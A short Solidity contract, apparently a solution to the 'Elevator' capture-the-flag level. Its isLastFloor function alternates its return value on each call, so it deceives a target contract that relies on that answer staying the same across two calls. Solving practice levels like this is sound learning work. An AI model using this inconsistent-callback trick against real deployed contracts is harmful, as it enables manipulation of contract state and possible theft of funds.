// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract UpWeGo {
    bool public trigger = true;
    Elevator public elevator;

    constructor (address _elevatorAddress) {
        elevator = Elevator(_elevatorAddress);
    }

    function isLastFloor(uint) public returns (bool) {
        trigger = !trigger;
        return trigger;
    }

    function setTop(uint _floor) public {
        elevator.goTo(_floor);
    }
}